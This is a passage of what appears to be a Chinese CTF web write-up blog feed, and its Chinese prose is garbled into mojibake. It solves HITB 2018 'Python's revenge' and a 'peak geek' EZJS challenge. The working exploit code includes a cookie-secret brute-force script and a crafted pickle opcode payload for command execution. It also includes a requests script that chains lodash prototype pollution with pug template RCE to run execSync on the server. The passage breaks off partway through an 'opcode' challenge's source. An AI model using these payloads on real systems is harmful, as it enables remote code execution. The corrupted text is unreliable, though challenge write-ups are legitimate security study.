src="https://img-blog.csdnimg.cn/b1b39fad894e44e9a2d13046cb02b2a3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥åœ¨ç”¨<code>post</code>è¯·æ±‚æ—¶ï¼Œä¼šåœ¨é¡µé¢ä¸­å¸¦æœ‰<code>xsrf</code>æ ‡ç­¾ï¼Œå¦‚æœæ²¡æœ‰ä¼ å…¥<code>xsrf</code>å€¼åˆ™ä¼šäº§ç”Ÿ404ï¼Œä½¿ç”¨<code>get</code>ï¼Œä¸éœ€è¦<code>xsrf</code>ä¿æŠ¤ã€‚</p><p><img src="https://img-blog.csdnimg.cn/947635780dcd4a4baee831807f96db2a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…·ä½“å¯ä»¥å‚è€ƒ<a href="https://stackoverflow.com/questions/12890105/tornado-xsrf-argument-missing-from-post/12917054">https://stackoverflow.com/questions/12890105/tornado-xsrf-argument-missing-from-post/12917054</a></p><p>â€‹                       <a href="https://www.tornadoweb.org/en/latest/guide/security.html#cross-site-request-forgery-protection">https://www.tornadoweb.org/en/latest/guide/security.html#cross-site-request-forgery-protection</a></p><h1 id="HITBCTF-2018-Pythonâ€™s-revenge"><a href="#HITBCTF-2018-Pythonâ€™s-revenge" class="headerlink" title="HITBCTF 2018 Pythonâ€™s revenge"></a>HITBCTF 2018 Pythonâ€™s revenge</h1><p>è´´ä¸€ä¸‹æºç <a href="https://github.com/p4-team/ctf/tree/master/2018-04-11-hitb-quals/web_python">https://github.com/p4-team/ctf/tree/master/2018-04-11-hitb-quals/web_python</a></p><p>å…³é”®ä»£ç ï¼Œé‡å†™äº†<code>loads</code>æ–¹æ³•ï¼Œç”¨äº†<code>black_type_list </code>ç™½åå•è¿‡æ»¤ï¼ŒåŸç†å°±æ˜¯å°†<code>unpkler.dispatch[pickle.REDUCE]</code>ä¸­ä½¿ç”¨<code>R</code>æ“ä½œç¬¦å¼¹æ ˆæ—¶è°ƒç”¨çš„å‡½æ•°æ”¹æˆäº†<code>wrapper</code>å…ˆè¿›è¡Œäº†ä¸€éæ£€æŸ¥ï¼Œç»•è¿‡äº†è¿‡æ»¤å†æ‰§è¡Œ<code>func(*args, **kwargs)</code>è¿”å›ç»“æœã€‚</p><p><img src="https://img-blog.csdnimg.cn/f713855d70fd450db7ea31489c00738c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¥å£åœ¨<code>reminder</code>å‡½æ•°ï¼Œåœ¨<code>POST</code>è¯·æ±‚æ—¶ï¼Œåºåˆ—åŒ–åç”¨base64ç¼–ç ï¼Œç„¶åè°ƒç”¨äº†<code>make_cookie</code>ï¼Œåé¢å°†<code>cookie</code>èµ‹å€¼äº†ã€‚</p><p>â€‹    <img src="https://img-blog.csdnimg.cn/6d67538804e840a88e76cfb3fed295e8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œå°±åªæ˜¯è¿›è¡Œäº†ä¸€ä¸‹sha256åŠ å¯†ï¼Œé—®é¢˜æ—¶è¿™é‡Œçš„<code>secret</code>ä¸çŸ¥é“ï¼Œä½†æ˜¯æºç æœ€å¼€å§‹å¯ä»¥å‘ç°<code>cookie_secret</code>åœ¨<code>.secret</code>æ–‡ä»¶ä¸­ï¼Œè€Œä¸”åªå†™å…¥äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸€ä¸ªåŠ å¯†åçš„cookieå°† <code>secret</code>çˆ†ç ´å‡ºæ¥ã€‚    </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_cookie</span>(<span class="hljs-params">location, secret</span>):</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s!%s&quot;</span> % (calc_digest(location, secret), location)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_digest</span>(<span class="hljs-params">location, secret</span>):</span><span class="hljs-keyword">return</span> sha256(<span class="hljs-string">&quot;%s%s&quot;</span> % (location, secret)).hexdigest()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&#x27;.secret&#x27;</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;.secret&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        secret = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits)<br>                         <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))<br>        f.write(secret)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;.secret&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    cookie_secret = f.read().strip()<br></code></pre></div></td></tr></table></figure><p>ç”¨çˆ†ç ´å‡ºæ¥çš„<code>secret</code>ç»“åˆæ„é€ çš„<code>opcode</code>ä¼ªé€ ä¸€ä¸ªcookieç»•è¿‡<code>getlocation()</code>çš„æ£€æŸ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getlocation</span>():</span><br>    cookie = request.cookies.get(<span class="hljs-string">&#x27;location&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>    (digest, location) = cookie.split(<span class="hljs-string">&quot;!&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> safe_str_cmp(calc_digest(location, cookie_secret), digest):<br>        flash(<span class="hljs-string">&quot;Hey! This is not a valid cookie! Leave me alone.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    location = loads(b64d(location))<br>    <span class="hljs-keyword">return</span> location<br><br><br><br></code></pre></div></td></tr></table></figure><p>çˆ†ç ´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> string<br>data = <span class="hljs-string">&#x27;d7e3bd07f7ae389f07abe89d199ebae1e1e67b4479a98870ee5a3c4fe0f56237!VjErMQpwMAou&#x27;</span> <span class="hljs-comment">#æ‹¿äº†ä¸ªæ ·æœ¬</span><br>(calc_digest_result,location) = data.split(<span class="hljs-string">&#x27;!&#x27;</span>)<br>stringlist = string.ascii_letters<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">break_secret</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> stringlist:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> stringlist:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> stringlist:<br>                <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> stringlist:<br>                    data = location + i +j +k +p<br>                    <span class="hljs-keyword">if</span> sha256(data).hexdigest() == calc_digest_result:<br>                        <span class="hljs-built_in">print</span> i +j +k +p<br>                        exit(<span class="hljs-number">1</span>)<br>break_secret()<br><br><span class="hljs-comment">#è¾“å‡º</span><br><span class="hljs-comment">#VjErMQpwMAou d7e3bd07f7ae389f07abe89d199ebae1e1e67b4479a98870ee5a3c4fe0f56237</span><br><span class="hljs-comment">#hitb</span><br></code></pre></div></td></tr></table></figure><blockquote><p>æ¥ä¸‹æ¥ï¼Œè§£å†³pythonçš„æ²™ç›’é€ƒé€¸é—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä»¬è¦æ‰¾å‡ºä¸€ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼Œè¿™é‡Œè¿‡æ»¤å¾ˆå¾ˆå¤šï¼Œä½†æ˜¯ä»”ç»†æƒ³æƒ³ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°æ³¨æ„åˆ°è¿™æ®µä»£ç çš„ä¸€ä¸ªé‡è¦äº‹æƒ… - å®ƒæ˜¯Python 2ï¼Œå¹¶ä¸”åœ¨é»‘åå•ä¸­æ²¡æœ‰inputï¼ˆï¼‰å‡½æ•°ã€‚å…³äºè¿™ä¸ªå‡½æ•°ï¼Œpython 2å’Œ3ä¹‹é—´æœ‰å¾ˆå¤§çš„åŒºåˆ«ã€‚åœ¨python 3ä¸­ï¼Œå®ƒçš„è¡Œä¸ºä¸python 2ä¸­çš„raw_inputï¼ˆï¼‰ç›¸åŒ ,å®ƒåªæ˜¯ä»stdinè¯»å–è¾“å…¥ã€‚ä½†åœ¨python 2ä¸­å®ƒæ‰€åšçš„å®é™…ä¸Šæ˜¯evalï¼ˆraw_inputï¼ˆï¼‰ï¼‰ï¼Œæ‰€ä»¥é€šè¿‡ä½¿ç”¨inputï¼ˆï¼‰æˆ‘ä»¬å¯ä»¥åševalï¼ˆï¼‰ã€‚inputå‡½æ•°åœ¨__builtin__ moudleä¸­ï¼Œäºæ˜¯æœ‰ï¼š`</p></blockquote><p>è¿™ä¸ªåœ°æ–¹æ³¨æ„inputéœ€è¦ä»stdinè¯»å–æ•°æ®ï¼Œåˆ™æœ€ç»ˆæ„é€ çš„payloadå®é™…ä¸º </p><p>å…³äºstdinå¯çœ‹<a href="https://www.codenong.com/1450393/">https://www.codenong.com/1450393/</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">__builtin__.<span class="hljs-built_in">setattr</span>(__builtin__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>),sysin,cStringIO.StringIO(<span class="hljs-string">&#x27;éœ€è¦æ‰§è¡Œçš„å‘½ä»¤&#x27;</span>))<br>__builtin__.<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;python&gt;&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>æ„é€ opcodeä¸º</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">command_to_eval = raw_input(<span class="hljs-string">&quot;python&gt; &quot;</span>)<br>data = <span class="hljs-string">b&quot;&quot;&quot;c__builtin__</span><br><span class="hljs-string">setattr</span><br><span class="hljs-string">(c__builtin__</span><br><span class="hljs-string">__import__</span><br><span class="hljs-string">(S&#x27;sys&#x27;</span><br><span class="hljs-string">tRS&#x27;stdin&#x27;</span><br><span class="hljs-string">cStringIO</span><br><span class="hljs-string">StringIO</span><br><span class="hljs-string">(S&#x27;&quot;&quot;&quot;</span> +   command_to_eval  +  <span class="hljs-string">&quot;&quot;&quot;&#x27;</span><br><span class="hljs-string">tRtRc__builtin__</span><br><span class="hljs-string">input</span><br><span class="hljs-string">(S&#x27;python&gt;&#x27;</span><br><span class="hljs-string">tR.&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>æµ‹è¯•äº†ä¸€ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/06d2c47ff5be4d378954d78df472a483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€åå¯ä»¥è¾“å…¥__import__(â€˜osâ€™).listdir(â€œ/â€œ)ã€<strong>import</strong>(â€˜osâ€™).system(â€œlsâ€) ã€<strong>import</strong>(â€˜subprocessâ€™).check_output(â€œlsâ€)ç­‰è¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥å‘ç°æ ¹ç›®å½•ä¸‹å­˜åœ¨flag_is_here,æ‰§è¡Œopen(â€œ/flag_is_hereâ€,â€râ€).read()ï¼Œå¾—åˆ°ï¼šHITB{Py5h0n1st8eBe3tNOW}ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å·…å³°æå®¢æ€»ç»“</title>
    <link href="/2021/08/09/2021-8-6-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/08/09/2021-8-6-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="EZJS"><a href="#EZJS" class="headerlink" title="EZJS"></a>EZJS</h1><p>ä¸€ç‚¹éƒ½ä¸ezï¼Œçœ‹äº†ä¸€ä¸‹åˆè¿˜æ˜¯æ²¡åšå‡ºæ¥ï¼Œæ„Ÿè§‰è¦è¢«å¼€äº†ï¼Œä»¥å‰æ²¡å’‹é‡åˆ°è¿‡jsçš„åŸå‹é“¾æ±¡æŸ“ï¼Œç°å­¦äº†ä¸€ä¸‹åŸç†ä½†è¿˜æ˜¯æ²¡æ‰¾ä¸åˆ°é“¾ï¼Œå±å®è‡ªå·±çš„jsæ°´å¹³å¤ªçƒ‚äº†ã€‚</p><p>è¿™é‡Œç”¨åˆ°çš„åŸå‹é“¾æ±¡æŸ“åŸç†å‚è€ƒ:<a href="https://paper.seebug.org/1426/#_1">https://paper.seebug.org/1426/#_1</a></p><p>pugçš„rceæ¼æ´åŸç†å‚è€ƒï¼š<a href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>éšä¾¿ç™»å½•åå¯ä»¥åœ¨<code>newimg</code>å‘ç°æ–‡ä»¶è¯»å–ã€‚å¯ä»¥å…ˆè¯»å–<code>package.json</code>,<code>package-lock.json</code>çœ‹çœ‹ç‰ˆæœ¬ã€‚</p><p><img src="https://img-blog.csdnimg.cn/5eda8a13f65c4647acc9b3d120cf2840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>lodash</code>&lt;4.17.17æ—¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œpugæœ‰rceå‘½ä»¤æ‰§è¡Œã€‚çœ‹ä¸€ä¸‹<code>index.js</code>æºç ï¼Œæ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">router.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-comment">//req.session.debug = true;</span><br><br>  <span class="hljs-keyword">if</span> (req.session.username !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.isadmin !== <span class="hljs-literal">undefined</span>) &#123;<br><br>    <span class="hljs-keyword">if</span> (req.query.newimg !== <span class="hljs-literal">undefined</span>) req.session.img = req.query.newimg;<br><br>    <span class="hljs-keyword">var</span> imgdata = fs.readFileSync(req.session.img? req.session.img: <span class="hljs-string">&quot;./images/1.png&quot;</span>);<br>    <span class="hljs-keyword">var</span> base64data = Buffer.from(imgdata, <span class="hljs-string">&#x27;binary&#x27;</span>).toString(<span class="hljs-string">&#x27;base64&#x27;</span>);<br><br>    <span class="hljs-keyword">var</span> info = &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;æˆ‘çš„ç©ºé—´&#x27;</span>, <span class="hljs-attr">msg</span>: req.session.username, <span class="hljs-attr">png</span>: <span class="hljs-string">&quot;data:image/png;base64,&quot;</span> + base64data, <span class="hljs-attr">diy</span>: <span class="hljs-string">&quot;åå¹´ç£¨ä¸€å‰‘v0.0.0(å°šå¤„äºå¼€å‘ç‰ˆ&quot;</span>&#125;;<br><br><br>    <span class="hljs-keyword">if</span> (req.session.isadmin !== <span class="hljs-string">&quot;notadmin&quot;</span>) &#123;<br><br>      <span class="hljs-keyword">if</span> (req.session.debug !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.debug !== <span class="hljs-literal">false</span>) info.pretty = req.query.p;<br>      <span class="hljs-keyword">if</span> (req.query.diy !== <span class="hljs-literal">undefined</span>) req.session.diy = req.query.diy;<br>      info.diy = req.session.diy ? req.session.diy: <span class="hljs-string">&quot;å°Šè´µçš„admin&quot;</span>;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;msg&#x27;</span>, &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;plz login first&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹å°±æ˜¯å¯ä»¥è¯»å–æºç çš„æ¼æ´åŸå› ã€‚</p><p><img src="https://img-blog.csdnimg.cn/068344140be04497ad8f415f499b424d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¾€ä¸‹çœ‹ï¼Œåˆ¤æ–­<code>req.session.isadmin !== &quot;notadmin&quot;</code>ï¼Œç„¶åçš„åˆ¤æ–­æ˜¯å…³é”®ã€‚è¿™é‡Œéœ€è¦å°†<code>req.session.debug</code>æ±¡æŸ“æˆç©ºå€¼æˆ–å…¶ä»–çš„æ»¡è¶³æ¡ä»¶çš„æ¥ç»•è¿‡ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨<code>pug</code>çš„RCEæ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="https://img-blog.csdnimg.cn/9cc5405b335c4fdfac77ae4691fa660b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å‚è€ƒæ–‡ç« é‡Œé¢çš„<code>payload</code>ä¸­å­˜åœ¨è½¬ä¹‰å·ï¼Œè¿™æ˜¯å› ä¸ºé‚£ä¸ªé‡Œé¢ç”¨äº†<code>json</code>è§£æï¼Œåˆ™è¦ç”¨è½¬ä¹‰å·è½¬ç§»å¼•å·ï¼Œè¿™é‡Œåˆ™ä¸éœ€è¦ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://localhost:5000/&quot;</span><br>session=requests.session()<br>session.post(url+<span class="hljs-string">&#x27;login&#x27;</span>,data=&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">26</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">26</span><br>&#125;)<br>payload=&#123;<span class="hljs-string">&#x27;&quot;].__proto__[&quot;isadmin&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>,<br><span class="hljs-string">&#x27;&quot;].__proto__[&quot;debug&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;<br>r=session.get(url+<span class="hljs-string">&#x27;admin&#x27;</span>,params=&#123;<br>    <span class="hljs-string">&quot;p&quot;</span>:<span class="hljs-string">&quot;&#x27;);return process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;tac /root/flag.txt&#x27;);_=(&#x27;&quot;</span><br>&#125;,data=payload)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></div></td></tr></table></figure><p>ä¸­é—´å¾ˆå¤šè‡ªå·±nodeæ­ç¯å¢ƒè°ƒè¯•çš„è¿‡ç¨‹å°±æ‡’å¾—è´´äº†ï¼Œæ€»ç»“ä¸€ä¸‹ç¼–ç¨‹ä»£ç åŠŸåº•è¿˜æ˜¯æœ€åŸºç¡€çš„ä¸œè¥¿å‘€ï¼ï¼ï¼</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>è€ƒçš„æ˜¯<code>pickle</code>çš„çŸ¥è¯†</p><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/264363.html">https://www.freebuf.com/articles/web/264363.html</a></p><p>â€‹            <a href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a></p><p><code>pickle.dumps</code>å°†å¯¹è±¡ååºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œ<code>pickle.dump</code>å°†ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å­˜å‚¨ä¸ºæ–‡ä»¶ã€‚</p><p><code>pickle.loads() </code>å¯¹è±¡ååºåˆ—åŒ– <code>pickle.load()</code> å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚</p><p>çœ‹ä¸€ä¸‹æºç </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> session<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span><br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;map&#x27;</span>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loads</span>(<span class="hljs-params">data</span>):</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(data)).load()<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&quot;y0u-wi11_neuer_kn0vv-!@#se%32&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods = [<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin</span>():</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])!= <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>] , encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)!= <span class="hljs-string">&#x27;admin&#x27;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not admin&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        